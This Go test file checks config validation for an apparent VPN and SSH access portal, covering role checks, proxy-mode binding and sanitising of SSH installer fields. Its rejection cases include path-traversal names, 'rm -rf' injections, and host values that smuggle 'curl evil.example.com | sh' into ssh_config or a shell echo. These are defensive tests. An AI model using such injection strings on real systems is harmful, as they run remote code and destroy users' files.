package config

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestProfileAllowedFor pins the behaviour that the previous implementation got
// wrong: it granted every profile to every caller unconditionally.
func TestProfileAllowedFor(t *testing.T) {
	t.Parallel()

	profile := Profile{Name: "livedata", Roles: []string{"vpn-livedata", "vpn-admin"}}

	tests := []struct {
		name  string
		roles []string
		want  bool
	}{
		{"matching role", []string{"vpn-livedata"}, true},
		{"second matching role", []string{"vpn-admin"}, true},
		{"one of several roles matches", []string{"other", "vpn-admin", "more"}, true},
		{"no roles at all", nil, false},
		{"empty role list", []string{}, false},
		{"unrelated role", []string{"vpn-other"}, false},
		{"many unrelated roles", []string{"a", "b", "c", "d", "e"}, false},
		{"role is a prefix, not a match", []string{"vpn-live"}, false},
		{"role differs in case", []string{"VPN-LIVEDATA"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := profile.AllowedFor(tt.roles); got != tt.want {
				t.Errorf("AllowedFor(%q) = %v, want %v", tt.roles, got, tt.want)
			}
		})
	}
}

// A profile granting no roles must match nobody, however many roles the caller
// presents. The old code panicked or granted access in this shape.
func TestProfileWithoutRolesDeniesEveryone(t *testing.T) {
	t.Parallel()

	profile := Profile{Name: "orphan"}
	for _, roles := range [][]string{nil, {"any"}, {"a", "b", "c", "d", "e", "f", "g"}} {
		if profile.AllowedFor(roles) {
			t.Errorf("AllowedFor(%q) = true, want false", roles)
		}
	}
}

func TestRoles(t *testing.T) {
	t.Parallel()

	tests := []struct {
		header string
		want   []string
	}{
		{"", nil},
		{"   ", nil},
		{"a", []string{"a"}},
		{"a,b", []string{"a", "b"}},
		{" a , b ", []string{"a", "b"}},
		{"a,,b", []string{"a", "b"}},
		{",", nil},
	}

	for _, tt := range tests {
		t.Run(tt.header, func(t *testing.T) {
			t.Parallel()
			got := Roles(tt.header)
			if len(got) != len(tt.want) {
				t.Fatalf("Roles(%q) = %q, want %q", tt.header, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Fatalf("Roles(%q) = %q, want %q", tt.header, got, tt.want)
				}
			}
		})
	}
}

const validProfile = `
profiles:
  - name: livedata
    description: Live Data
    max-session: 2h
    roles: [vpn-livedata]
    routes:
      - 192.168.1.0/24
    rules:
      - dest: 192.168.1.0/24
        port: 53
        protocol: tcp
        action: ACCEPT
template: "client\n"
`

func TestLoadValid(t *testing.T) {
	t.Parallel()

	c := loadString(t, validProfile)

	if c.Listen != defaultListen {
		t.Errorf("Listen = %q, want the loopback default %q", c.Listen, defaultListen)
	}
	if c.RolesHeader != defaultRolesHeader {
		t.Errorf("RolesHeader = %q, want %q", c.RolesHeader, defaultRolesHeader)
	}
	if c.ProfileTemplate() == nil {
		t.Error("ProfileTemplate() = nil, want the template parsed at load time")
	}

	p, err := c.Profile("livedata")
	if err != nil {
		t.Fatalf("Profile(livedata): %v", err)
	}
	if time.Duration(p.Duration) != 2*time.Hour {
		t.Errorf("Duration = %s, want 2h", p.Duration)
	}
}

// The old getProfile returned Profiles[0] alongside its error, and panicked
// outright when no profiles were configured.
func TestProfileNotFound(t *testing.T) {
	t.Parallel()

	c := loadString(t, validProfile)

	got, err := c.Profile("nope")
	if !errors.Is(err, ErrNoProfile) {
		t.Fatalf("Profile(nope) error = %v, want ErrNoProfile", err)
	}
	if got.Name != "" {
		t.Errorf("Profile(nope) = %q, want the zero profile", got.Name)
	}
}

func TestLoadRejects(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		yaml string
		want string
	}{{
		name: "path traversal in profile name",
		yaml: `
profiles:
  - name: ../../etc/cron.d/evil
    max-session: 1h
    roles: [r]
template: "x"`,
		want: "name must match",
	}, {
		name: "profile granting no roles",
		yaml: `
profiles:
  - name: orphan
    max-session: 1h
template: "x"`,
		want: "no roles",
	}, {
		name: "unparseable duration",
		yaml: `
profiles:
  - name: p
    max-session: two hours
    roles: [r]
template: "x"`,
		want: "parse duration",
	}, {
		name: "duration over the ceiling",
		yaml: `
profiles:
  - name: p
    max-session: 720h
    roles: [r]
template: "x"`,
		want: "exceeds",
	}, {
		name: "zero duration",
		yaml: `
profiles:
  - name: p
    max-session: 0s
    roles: [r]
template: "x"`,
		want: "greater than zero",
	}, {
		name: "destination is not a CIDR",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]
    rules:
      - dest: 192.168.1.0
        action: ACCEPT
template: "x"`,
		want: "parse network",
	}, {
		name: "action is not an enum member",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]
    rules:
      - dest: 10.0.0.0/8
        action: "ACCEPT; rm -rf /"
template: "x"`,
		want: "action",
	}, {
		name: "protocol is not an enum member",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]
    rules:
      - dest: 10.0.0.0/8
        protocol: "tcp -j DROP"
        action: ACCEPT
template: "x"`,
		want: "protocol",
	}, {
		name: "port without a port-bearing protocol",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]
    rules:
      - dest: 10.0.0.0/8
        port: 53
        protocol: icmp
        action: ACCEPT
template: "x"`,
		want: "requires protocol",
	}, {
		name: "route is not a CIDR",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]
    routes:
      - not-an-ip
template: "x"`,
		want: "parse network",
	}, {
		name: "duplicate profile names",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]
  - name: p
    max-session: 1h
    roles: [r]
template: "x"`,
		want: "duplicate",
	}, {
		name: "no profiles",
		yaml: `template: "x"`,
		want: "no profiles",
	}, {
		name: "missing template",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]`,
		want: "template is empty",
	}, {
		name: "unparseable template",
		yaml: `
profiles:
  - name: p
    max-session: 1h
    roles: [r]
template: "{{ .Unclosed "`,
		want: "parse template",
	}, {
		name: "half-configured CA",
		yaml: `
ca-certificate-file: /tmp/cert.pem
profiles:
  - name: p
    max-session: 1h
    roles: [r]
template: "x"`,
		want: "must be set together",
	}, {
		name: "configdir without a path",
		yaml: `
configdir-enabled: true
profiles:
  - name: p
    max-session: 1h
    roles: [r]
template: "x"`,
		want: "requires configdir-path",
	}, {
		name: "unknown field is a typo, not a comment",
		yaml: `
listem: :9000
profiles:
  - name: p
    max-session: 1h
    roles: [r]
template: "x"`,
		want: "listem",
	}}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			_, err := Load(writeConfig(t, tt.yaml))
			if err == nil {
				t.Fatalf("Load() succeeded, want an error containing %q", tt.want)
			}
			if !strings.Contains(err.Error(), tt.want) {
				t.Errorf("Load() error = %v, want it to contain %q", err, tt.want)
			}
		})
	}
}

func loadString(t *testing.T, yaml string) *Config {
	t.Helper()

	c, err := Load(writeConfig(t, yaml))
	if err != nil {
		t.Fatalf("Load(): %v", err)
	}
	return c
}

func writeConfig(t *testing.T, yaml string) string {
	t.Helper()

	path := filepath.Join(t.TempDir(), "conf.yaml")
	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}
	return path
}

// Proxy mode verifies nothing: the caller is whoever the headers say. The
// chart once pointed its Ingress straight at a portal in that mode, so the
// combination is refused rather than left to be spotted in a review.
func TestProxyModeRequiresLoopback(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		listen string
		extra  string
		reject bool
	}{
		{name: "default is loopback", listen: ""},
		{name: "explicit loopback", listen: "127.0.0.1:9000"},
		{name: "loopback by name", listen: "localhost:9000"},
		{name: "ipv6 loopback", listen: "[::1]:9000"},
		{name: "every interface", listen: "0.0.0.0:9000", reject: true},
		{name: "no host at all", listen: ":9000", reject: true},
		{name: "a routable address", listen: "10.0.0.5:9000", reject: true},
		{
			name:   "acknowledged",
			listen: "0.0.0.0:9000",
			extra:  "auth:\n  insecure-trusted-headers: true\n",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			yaml := validProfile + tt.extra
			if tt.listen != "" {
				// Quoted: an IPv6 address is a flow sequence to YAML.
				yaml += "listen: \"" + tt.listen + "\"\n"
			}

			_, err := Load(writeConfig(t, yaml))
			switch {
			case tt.reject && err == nil:
				t.Fatalf("Load() accepted proxy mode on %s", tt.listen)
			case tt.reject && !strings.Contains(err.Error(), "auth mode is proxy"):
				t.Errorf("Load() error = %v, want it to name the mode", err)
			case !tt.reject && err != nil:
				t.Fatalf("Load(): %v", err)
			}
		})
	}
}

// The guard is about who can reach the port, not about the mode alone: when
// Gruff holds the session itself it is meant to be exposed.
func TestOIDCModeMayBindPublicly(t *testing.T) {
	t.Parallel()

	key := filepath.Join(t.TempDir(), "session.key")
	if err := os.WriteFile(key, make([]byte, 32), 0o600); err != nil {
		t.Fatalf("write session key: %v", err)
	}

	yaml := validProfile + `listen: 0.0.0.0:9000
auth:
  mode: oidc
  issuer: https://auth.example.com
  client-id: gruff
  client-secret: shh
  redirect-url: https://gruff.example.com/auth/callback
  session-key-file: ` + key + "\n"

	if _, err := Load(writeConfig(t, yaml)); err != nil {
		t.Fatalf("Load(): %v", err)
	}
}

// The SSH installer is a shell script that runs on the user's machine, and the
// fragment it writes lands in their ~/.ssh/config. The operator who writes the
// config and the person who runs the script are different people, so these
// fields are not free text however trusted the operator is.
func TestConfigRejectsValuesThatEscapeTheInstaller(t *testing.T) {
	t.Parallel()

	const sshProfile = `
ssh-profiles:
  - name: bastion
    description: %s
    max-session: 1h
    roles: [ssh-bastion]
    principals: [ops]
    hosts: [%s]
template: "client\n"
`

	tests := []struct {
		name        string
		description string
		host        string
		want        string
	}{{
		name:        "a newline in a description starts a command",
		description: `"ok\nrm -rf ~/important"`,
		host:        "good.example.com",
		want:        "not printable",
	}, {
		// This one outlives the credential: ssh reads the file every time.
		name:        "a newline in a host adds an ssh_config directive",
		description: "Bastion",
		host:        `"good.example.com\n    ProxyCommand curl evil.example.com|sh"`,
		want:        "must match",
	}, {
		name:        "a carriage return counts too",
		description: `"ok\rrm -rf ~"`,
		host:        "good.example.com",
		want:        "not printable",
	}, {
		name:        "a quote in a host breaks out of the echo",
		description: "Bastion",
		host:        `"a'; curl evil.example.com | sh; echo '"`,
		want:        "must match",
	}, {
		name:        "a space in a host is two Host patterns",
		description: "Bastion",
		host:        `"good.example.com *"`,
		want:        "must match",
	}}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			yaml := fmt.Sprintf(sshProfile, tt.description, tt.host)
			_, err := Load(writeConfig(t, yaml))
			if err == nil {
				t.Fatalf("Load() accepted it, want an error containing %q", tt.want)
			}
			if !strings.Contains(err.Error(), tt.want) {
				t.Errorf("Load() error = %v, want it to contain %q", err, tt.want)
			}
		})
	}
}

// The narrowing must not cost the patterns an operator has a real use for.
func TestConfigAcceptsOrdinaryHosts(t *testing.T) {
	t.Parallel()

	for _, host := range []string{
		"bastion.example.com",
		"*.internal.example.com",
		"10.0.0.5",
		"host-01_b",
		"web?.example.com",
		"!excluded.example.com",
	} {
		t.Run(host, func(t *testing.T) {
			t.Parallel()

			yaml := fmt.Sprintf(`
ssh-profiles:
  - name: bastion
    description: The bastion, reachable from anywhere
    max-session: 1h
    roles: [ssh-bastion]
    principals: [ops]
    hosts: [%q]
template: "client\n"
`, host)
			if _, err := Load(writeConfig(t, yaml)); err != nil {
				t.Errorf("Load() rejected %q: %v", host, err)
			}
		})
	}
}
